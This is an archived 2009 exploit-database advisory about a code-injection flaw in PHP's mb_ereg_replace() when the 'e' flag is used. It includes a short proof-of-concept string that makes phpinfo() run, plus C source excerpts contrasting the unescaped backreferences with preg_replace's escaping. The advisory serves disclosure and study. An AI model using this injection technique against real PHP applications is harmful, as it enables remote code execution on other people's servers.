<html><head><title>PHP mb_ereg(i)_replace() Evaluate Replacement String Vulnerability</title></head><pre>mb_ereg(i)_replace() evaluate replacement string vulnerability
 
by ryat#www.80vul.com

when option parameter set e, matchs not be escaped.

ex:

&lt;?php

function hi80vul() {}

$str = '\', phpinfo(), \'';
mb_ereg_replace('^(.*)$', 'hi80vul(\'\1\')', $str, 'e');

?&gt;

phpinfo() will be evaluated.

mb_ereg_replace()

    if ((replace_len - i) &gt;= 2 &amp;&amp; fwd == 1 &amp;&amp;
     p[0] == '\\' &amp;&amp; p[1] &gt;= '0' &amp;&amp; p[1] &lt;= '9') {
     n = p[1] - '0';
    }
    if (n &gt;= 0 &amp;&amp; n &lt; regs-&gt;num_regs) {
     if (regs-&gt;beg[n] &gt;= 0 &amp;&amp; regs-&gt;beg[n] &lt; regs-&gt;end[n] &amp;&amp; regs-&gt;end[n] &lt;= string_len) {
      smart_str_appendl(pbuf, string + regs-&gt;beg[n], regs-&gt;end[n] - regs-&gt;beg[n]);
// matchs not be escaped
     }
     
preg_replace()

  if ('\\' == *walk || '$' == *walk) {
   smart_str_appendl(&amp;code, segment, walk - segment);
   if (walk_last == '\\') {
    code.c[code.len-1] = *walk++;
    segment = walk;
    walk_last = 0;
    continue;
   }
   segment = walk;
   if (preg_get_backref(&amp;walk, &amp;backref)) {
    if (backref &lt; count) {
     /* Find the corresponding string match and substitute it
        in instead of the backref */
     match = subject + offsets[backref&lt;&lt;1];
     match_len = offsets[(backref&lt;&lt;1)+1] - offsets[backref&lt;&lt;1];
     if (match_len) {
      esc_match = php_addslashes_ex(match, match_len, &amp;esc_match_len, 0, 1 TSRMLS_CC);
// matchs escaped by addslashes()
...
    smart_str_appendl(&amp;code, esc_match, esc_match_len);

# milw0rm.com [2009-05-07]</pre></html>